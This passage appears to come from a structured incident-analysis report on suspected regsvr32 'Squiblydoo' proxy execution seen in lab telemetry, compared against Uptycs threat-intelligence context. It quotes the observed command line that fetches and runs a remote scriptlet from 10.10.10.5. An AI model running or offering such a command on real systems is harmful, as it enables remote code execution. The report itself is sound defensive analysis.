The Uptycs CTI is only external context describing regsvr32 COM-scriptlet abuse and does not establish local compromise, HTTP completion, or C2.",
  "executive_summary": "On WORKSTATION5.mordor.local, observed process creation and one regsvr32.exe connection support suspected Squiblydoo-style proxy execution. CTI provides technique and investigation context only; HTTP completion, content, bytes transferred, exfiltration, and C2 purpose remain unverified.",
  "technical_analysis": "Observed local telemetry: an external PowerShell parent (PID 8648, not captured as a created process in this slice) created regsvr32.exe (PID 9384, GUID {b59756a9-b238-5f17-5207-000000000400}) at 2020-07-22T03:27:53.548000Z with command line `\"C:\\windows\\system32\\regsvr32.exe\" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll` (jsonl:line:97, jsonl:line:219). That regsvr32.exe then created an encoded PowerShell child (PID 9076) at 2020-07-22T03:27:54.604000Z / 03:27:54.620000Z (jsonl:line:224, jsonl:line:283), and the child made nine observed connections to 10.10.10.5:80 from 03:27:57.014000Z to 03:28:28.429000Z (connections-process-1a7b3c442952cc5a). Separately, regsvr32.exe itself made one Sysmon Event ID 3 connection to 10.10.10.5:8444 at 03:27:55.955000Z (jsonl:line:1001, connections-process-1356a3e1f91322ca). These observations support suspected system-binary proxy execution, but they do not prove HTTP completion, response content, transferred bytes, exfiltration, or C2 purpose. CTI context: the Uptycs report published 2022-02-09 and accessed 2026-10-30 states that threat actors can use regsvr32 for loading COM scriptlets and illustrates an HTTP /i invocation with scrobj.dll (cti-8606d039670518a18210, text:chars:5618:5675). A second Uptycs chunk notes parent-child telemetry and correlation as investigation context and that local network events still require their own process identity, destination, and timing evidence, without proving transferred content or C2 intent (cti-2e9d0a7136b0cfa3cf53, text:chars:7388:7446). Comparison: the similarity is the regsvr32 /i HTTP scriptlet invocation with scrobj.dll and the parent-child investigation context. The difference is that CTI is publisher-reported external context based on Uptycs data, while local telemetry identifies the exact host, process GUID/PID, command line, destination, port, and timestamp. The command preserves `/n` and contains only an HTTP URL; no UNC path is observed, so a remote UNC share must not be inferred. Candidate assessment T1218.010 remains candidate with needs_review status (assessment-T1218-010).",
